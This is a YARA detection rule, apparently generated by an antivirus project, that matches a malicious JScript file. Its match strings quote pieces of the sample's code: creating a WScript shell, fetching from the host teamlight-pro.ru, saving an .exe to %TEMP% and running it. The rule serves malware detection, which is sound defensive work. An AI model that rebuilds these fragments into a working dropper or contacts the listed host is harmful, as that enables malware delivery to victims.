rule sig_20160401_519c3a0d4d861ecfc81b02bfdb1e35de {
  meta:
    description = "datamaliciousorder - file 20160401_519c3a0d4d861ecfc81b02bfdb1e35de.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d977d5f2bd4ed9e40110558ce66398ec837b9903f0838ff3e7a1e7c121bfbe7f"

  strings:
    $s1  = "var LrBlz = function ZoyFr() {return WScript[VnrVqg](\"WScript\"+\".Shell\");}(), AmrMmo = 11;" fullword ascii
    $s2  = "function NaxYo(SjWc, MwGfa){EmHcw = EmHcw * 1; return SjWc - MwGfa;};" fullword ascii
    $s3  = "WcHln[YiSpb](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s4  = "if (WcHln[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZrvPz(){return YjPwy + \"\";};" fullword ascii
    $s6  = "function YpPaq() {return LrBlz[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"wzdd9vyk7w.ex\" + \"e\";};" fullword ascii
    $s7  = "function AxPp() {return ((YymNnz == true) && (YymNnz == YpDbx)) ? 1 : EmHcw;};" fullword ascii
    $s8  = "function CitHp(RugQlt){LrBlz[\"R\"+\"un\"](RugQlt, EmHcw, EmHcw);};" fullword ascii
    $s9  = "function JgXm(){return 23;};" fullword ascii
    $s10 = "var LyeGtq = new this[\"Date\"]();" fullword ascii
    $s11 = "var EjoXy = false;" fullword ascii
    $s12 = "function JmRa()" fullword ascii
    $s13 = "var YpDbx = false;" fullword ascii
    $s14 = "return NaxYo(ZgZv, WgdCu);" fullword ascii
    $s15 = "YpDbx = true; " fullword ascii
    $s16 = "}while (ElaIh);" fullword ascii
    $s17 = "function ZljVgr(){return VnrVqg;};" fullword ascii
    $s18 = "var YymNnz = false;" fullword ascii
    $s19 = "YymNnz = true; " fullword ascii
    $s20 = "function EmfGb(AdTan) {var TifUa = (1, 2, 3, 4, 5, AdTan); return TifUa;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}